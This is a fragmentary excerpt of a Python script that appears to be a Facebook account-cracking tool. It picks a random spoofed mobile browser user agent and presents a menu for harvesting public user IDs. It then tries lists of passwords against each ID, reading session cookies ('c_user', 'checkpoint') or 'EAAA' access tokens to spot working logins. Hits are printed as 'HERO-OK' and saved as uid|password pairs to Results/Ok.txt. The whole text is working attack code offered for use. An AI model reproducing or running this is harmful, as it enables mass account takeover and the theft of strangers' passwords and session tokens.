...
ua_itel=('Mozilla/5.0 (Linux; Android 9; itel W6003 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo,ua_itel])
...
def ___menu___():
    ...
    print("\n%s[%s1%s]%s Get ID Publick Hero %s[%s2004%s-%s2021%s]"%(H,U,H,P,K,H,B,H,K))
    print("%s[%s2%s]%s Get ID Publick Hero Old %s[%s2009%s-%s2006%s]"%(H,U,H,P,K,H,B,H,K))
    print("%s[%s3%s]%s Get ID Publick Hero New %s[%s2020%s-%s2021%s]"%(H,U,H,P,K,H,B,H,K))
    ...
    try:
        for pw in pwx:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print("\r\x1b[1;92m[HERO-OK] %s | %s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s | %s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s | %s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[HERO-CP] %s | %s\x1b[1;97m       "%(uid, pw))
    ...
    try:
        for pw in pwx:
            ...
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[HERO-OK] %s | %s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s | %s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s | %s\n"%(uid, pw))
                break
